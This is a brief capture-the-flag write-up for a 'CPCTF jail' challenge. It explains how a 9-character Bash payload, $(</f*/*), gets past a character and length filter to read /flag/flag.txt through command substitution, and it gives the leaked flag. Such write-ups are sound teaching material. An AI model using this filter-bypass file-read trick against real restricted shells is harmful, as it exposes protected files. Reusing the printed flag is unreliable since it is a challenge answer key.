# CPCTF jail

The filter only allows characters from `cpctf` and punctuation, with length at most `10`:

```python
ALLOWED = set("cpctf" + string.punctuation)
LEN_LIMIT = 10
```

But Bash command substitution is still available. The payload

```text
$(</f*/*)
```

is only `9` characters long and uses only allowed characters.

`$(<file)` is Bash shorthand for reading a file. Here `/f*/*` expands to `/flag/flag.txt`, so the command becomes the contents of the flag file itself. Bash then tries to execute that string as a command and prints it in the error message:

```text
/bin/bash: line 1: CPCTF{Y0ur3_4_7ru3_CPCTF_l0v3r}: command not found
```

Flag:

```text
CPCTF{Y0ur3_4_7ru3_CPCTF_l0v3r}
```
